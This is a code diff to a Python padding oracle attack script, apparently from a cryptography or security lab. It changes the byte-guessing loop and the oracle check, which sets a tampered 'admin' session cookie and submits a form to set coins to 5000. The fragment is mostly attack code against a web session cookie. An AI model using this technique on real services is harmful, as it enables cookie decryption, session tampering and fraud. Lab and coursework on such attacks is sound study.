@@ -61,8 +61,10 @@ def po_attack_2blocks(po, ctx):
         test = bytearray(16) 
         for val in range(256):
             test[i] = val
-            if check_padding_response(str(test).encode('utf-8')):
-                # print("Padding passed")
+            print("test byte array: {}".format(test))
+            # if check_padding_response(str(test).encode('utf-8')):
+            if check_padding_response(test):
+                print("Padding passed")
                 plaintext[i] = val ^ c0[i] ^ (16 - i)
     return plaintext
 
@@ -80,7 +82,7 @@ def check_response_code(response):
     """
     Given a response object, check its status code
     """
-    return response.status_code == codes.ok, response
+    return response.status_code == codes.ok
 
 def is_response_ok(response):
     """
@@ -98,15 +100,17 @@ def check_padding_response(cookie):
     """
     sess.cookies.set("admin", None)
     sess.cookies.set("admin", cookie.hex())
-    print("Cookies after maul: {}".format(sess.cookies.get_dict()))
+    # print("Len of cookie: {}".format(len(cookie)))
+    # print("Cookies after maul: {}".format(sess.cookies.get_dict()))
     result, response = do_setcoins_form(sess, uname, 5000)
     if result == False:
-        print("result false")
-    # print("Result status code: {}".format(result))
+        # print("Check padding response FALSE")
+        return False
     
+    return True
     # return is_response_ok(response)
     # TODO: Changed webserver to return 400 code when padding failed
-    return check_response_code(response)
+    # return check_response_code(response)
 
 if __name__ == "__main__":
     print("Running Padding Oracle Attack")
